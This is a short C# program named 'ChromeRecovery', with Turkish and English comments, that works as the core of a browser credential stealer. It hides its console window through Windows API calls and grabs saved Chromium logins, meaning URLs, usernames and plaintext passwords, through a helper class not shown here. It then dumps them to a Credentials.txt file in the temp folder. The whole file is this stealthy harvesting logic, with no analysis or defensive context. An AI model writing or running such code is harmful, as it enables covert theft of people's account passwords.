using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace ChromeRecovery
{
    class Program
    {
        [DllImport("kernel32.dll")] // konsolu gizlemek için
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); // bitiş
        static void Main(string[] args)
        {
            const int SW_HIDE = 0;
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE); // to hide the console

            var a = Chromium.Grab();

            string Credn = "";
            foreach (var b in a)
            {
                Credn += "Url: " + b.URL + Environment.NewLine + "Username: " + b.UserName + Environment.NewLine + "Password: " + b.Password + Environment.NewLine + "Application: " + b.Application + Environment.NewLine + "=============================" + Environment.NewLine;
            }
            if (File.Exists(Path.GetTempPath() + "\\Credentials.txt")) File.Delete(Path.GetTempPath() + "\\Credentials.txt");

            using (StreamWriter writer = new StreamWriter(Path.GetTempPath() + "\\Credentials.txt"))
            {
                writer.Write(Credn);
                writer.Close();
            }
        }
    }
}
